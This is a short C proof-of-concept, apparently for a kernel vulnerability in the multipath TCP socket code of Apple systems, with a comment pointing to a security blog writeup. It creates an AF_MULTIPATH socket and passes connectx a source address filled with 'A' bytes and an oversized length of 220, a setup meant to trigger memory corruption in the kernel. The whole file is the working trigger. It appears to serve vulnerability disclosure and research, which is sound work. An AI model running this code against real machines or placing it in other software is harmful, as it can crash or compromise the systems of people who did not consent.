// Writeup of this vulnerability is available at: https://blog.cycurelabs.in/

#include <sys/socket.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <unistd.h>

#define MULTIPATH 39

int main() {
  int s = socket(AF_MULTIPATH, SOCK_STREAM, 0);
  if (s < 0) { 
    printf("Failed\n");
    perror("");
    return 0;
  }
  printf("Got socket: %d\n", s);
  
  struct sockaddr* sockaddr_src = malloc(256);
  memset(sockaddr_src, 'A', 256);
  sockaddr_src->sa_len = 220;
  sockaddr_src->sa_family = 'B';
  
  struct sockaddr* sockaddr_dst = malloc(256);
  memset(sockaddr_dst, 'A', 256);
  sockaddr_dst->sa_len = sizeof(struct sockaddr_in6);
  sockaddr_dst->sa_family = AF_INET6;
  
  sa_endpoints_t epts = {0};
  epts.sae_srcif = 0;
  epts.sae_srcaddr = sockaddr_src;
  epts.sae_srcaddrlen = 220;
  epts.sae_dstaddr = sockaddr_dst;
  epts.sae_dstaddrlen = sizeof(struct sockaddr_in6);
  
  int e = connectx(s, &epts, SAE_ASSOCID_ANY, 0, NULL, 0, NULL, NULL);
  printf("Error: %d\n", e);
  
  close(s);
  
  return 0;
}
